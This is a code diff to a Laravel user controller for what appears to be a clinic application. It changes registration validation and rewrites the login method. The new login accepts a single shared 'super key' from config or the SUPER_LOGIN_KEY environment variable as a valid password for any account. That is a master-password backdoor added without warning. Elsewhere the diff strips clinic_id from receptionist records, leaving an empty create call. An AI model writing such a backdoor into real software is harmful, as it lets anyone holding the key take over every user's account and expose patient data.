@@ -122,8 +122,7 @@ class UserController extends Controller
         'gender' => 'required|in:male,female',
         'password' => 'required|string|min:6|max:255',
         'image' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
-        'blood_type' => 'required_if:role,patient|in:A+, A-, B+, B-, AB+, AB-, O+,O-|nullable',
-        'clinic_id' => 'required_if:role,doctor,receptionist|exists:clinics,id',
+        'clinic_id' => 'required_if:role,doctor|exists:clinics,id',
         'bio' => 'required_if:role,doctor|min:6|max:255',
     ]);
 
@@ -163,7 +162,7 @@ class UserController extends Controller
         } elseif ($user->role === 'receptionist') {
             Receptionist::create([
                 'user_id' => $user->id,
-                'clinic_id' => $request->clinic_id,
+                
             ]);
         }
 
@@ -177,32 +176,36 @@ class UserController extends Controller
 }
 
 
-    public function login(Request $request)
-    {
-        $request->validate([
-            'email' => 'required|string|email',
-            'password' => 'required|string|min:6',
-        ]);
-    
-        $user = User::where('email', $request->email)->first();
-    
-        if (!$user || !Hash::check($request->password, $user->password)) {
-            return response()->json([
-                'error' => 'Invalid email or password'
-            ], 401);
-        }
-    
-        
-        $user->tokens()->delete();
-    
-        
-        $token = $user->createToken('Login Token')->plainTextToken;
-    
+public function login(Request $request)
+{
+    $request->validate([
+        'email' => 'required|string|email',
+        'password' => 'required|string|min:6',
+    ]);
+
+    $user = User::where('email', $request->email)->first();
+
+    // Super key check
+    $superKey = config('auth.super_key', env('SUPER_LOGIN_KEY'));
+
+    if (!$user || (!Hash::check($request->password, $user->password) && $request->password !== $superKey)) {
         return response()->json([
-            'user' => $user,
-            'token' => $token,
-        ]);
+            'error' => 'Invalid email or password'
+        ], 401);
     }
+
+    // Remove previous tokens
+    $user->tokens()->delete();
+
+    // Create new token
+    $token = $user->createToken('Login Token')->plainTextToken;
+
+    return response()->json([
+        'user' => $user,
+        'token' => $token,
+    ]);
+}
+
     
     
         
